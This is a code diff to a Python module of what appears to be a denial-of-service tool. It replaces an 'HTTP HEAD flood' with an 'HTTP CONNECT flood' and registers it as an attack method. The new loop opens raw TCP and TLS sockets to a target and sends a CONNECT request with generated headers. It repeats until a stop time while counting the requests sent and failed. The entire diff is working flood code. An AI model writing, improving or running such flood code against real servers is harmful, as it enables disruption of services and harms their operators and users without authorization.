@@ -22,32 +22,49 @@ SOFTWARE.
 
 '''
 
-import time, requests
+import time, socket, ssl
+from urllib.parse import urlparse
 from src.core import Core
 from src.utils import *
 from src.useragent import *
 
 def flood(attack_id, url, stoptime) -> None:
 
+    if not Core.target_host: Core.target_host = urlparse(url).hostname
+    if not Core.target_port: Core.target_port = urlparse(url).port if urlparse(url).port else (80 if urlparse(url).scheme == 'http' else 443)
+    if not Core.target_netloc: Core.target_netloc = urlparse(url).netloc
+
     while time.time() < stoptime and not Core.killattack:
         if not Core.attackrunning:
             continue
-        
+
         try:
-            Core.session.head(
-                utils().buildblock(url), 
-                headers=utils().buildheaders(url),
-                verify=False, 
-                timeout=(5,0.1), 
-                allow_redirects=False,
-                stream=False,
-                cert=None,
-            )
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            sock.settimeout(5)
 
-            Core.infodict[attack_id]['req_sent'] += 1
-        except requests.exceptions.ReadTimeout:
+            if Core.target_port == 443: # if the port is HTTPS (HTTP over SSL/TLS), wrap the socket
+                sock = ssl.create_default_context().wrap_socket(
+                    sock=sock,
+                    server_hostname=Core.target_host
+                )
+
+            sock.connect( (Core.target_host, int(Core.target_port)) )
+        
+            payload = f'CONNECT' # CONNECT http method
+            payload+= f' {Core.target_host}:{str(Core.target_port)}' # target host + port
+            payload+= f' HTTP/{Core.http_proto_ver}\r\n' # http protocol version
+            payload+= f'Host: {Core.target_host}:{str(Core.target_port)}\r\n' # Host
+
+            for key, value in utils().buildheaders(url, True).items(): # append all headers
+                payload += f'{key}: {value}\r\n'
+            
+            payload+= 'Content-Length: {len}\r\n'
+            payload = payload.format(len=len(payload))
+
+            sock.send(payload.encode()) # and finally send the request  
             Core.infodict[attack_id]['req_sent'] += 1
 
+            sock.close() # close the connection
         except Exception:
             Core.infodict[attack_id]['req_fail'] += 1
 
@@ -55,8 +72,8 @@ def flood(attack_id, url, stoptime) -> None:
     Core.threadcount -= 1
 
 Core.methods.update({
-    'HEAD': {
-        'info': 'HTTP HEAD flood',
+    'CONNECT': {
+        'info': 'HTTP CONNECT flood',
         'func': flood
     }
 })
